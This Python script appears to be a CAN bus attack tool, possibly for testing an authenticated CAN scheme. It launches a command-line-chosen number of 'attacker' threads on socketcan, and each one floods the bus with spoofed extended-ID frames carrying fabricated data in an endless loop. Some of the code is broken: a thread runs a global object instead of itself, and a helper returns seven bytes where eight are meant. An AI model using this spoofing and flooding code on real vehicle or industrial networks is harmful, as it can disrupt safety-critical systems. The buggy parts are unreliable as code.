import can
import time
import sys
import hashlib
import random
import hmac
import base64
import threading

from canbus import CanBUS


class Transmitter(threading.Thread):
    bus = None
    idnode = 0
    tx_err = 0
    
    def __init__(self,bus_,idnode_, idThread_):
        threading.Thread.__init__(self)
            # create a bus instance
        # many other interfaces are supported as well (see below)
        self.bus = bus_
        self.idnode = idnode_
        self.idThread = idThread_
        
    #Compare transmitted with received message when same id
    def checkTransmission(self, mOnBus, mTrans):
        if(mOnBus.data != mTrans.data):
            return False
    
    def run(self):
        trans.transmit()
    
    def computeFalseData(self):
        data=[]

        for _ in range(0,7):
            data.append(int(random.uniform(0,256)))

        return data[0:8]
    
    def transmit(self):
        # build a message
        tstmp  =time.time()
        sendOk = True
        #id_count = 0x1232
        
        id_count = 0x12320000
        falseData = [0x12,0x34,0x56,0x78,0x9A,0xBC,0xDE,0x00]
        #falseData = [0x00,0x01,0x02,0x03,0x04,0x05,0x06,0xBD]
        r = self.idThread
        
        while(sendOk==True):  
            #Signed     
            target = id_count+r
                      
            #Not signed
            #target = id_count
            
            message = can.Message(timestamp=tstmp,
                arbitration_id=target, 
                extended_id=True,
                is_error_frame=False,
                data=falseData)
                
            self.bus.send(message)
            print("Transmitting:"+str(message))
            
            if(falseData[7] == 0xFF):
                falseData[7] = 0x00
                r = r + 5
            else:
                falseData[7] = falseData[7] + 0x01
                            
            if(r>65536):
                r = 0
            #time.sleep(5)
            
if __name__=="__main__":
    # create a bus instance
    bus = CanBUS(interface='socketcan',
                  channel='can0',
                  receive_own_messages=True)
    
    #Defining node ID
    idnode = 0x1231
    i=0
    attackers = int(sys.argv[1])

    while (i<attackers):
        trans = Transmitter(bus, idnode, i)
        trans.start()
        i = i + 1
            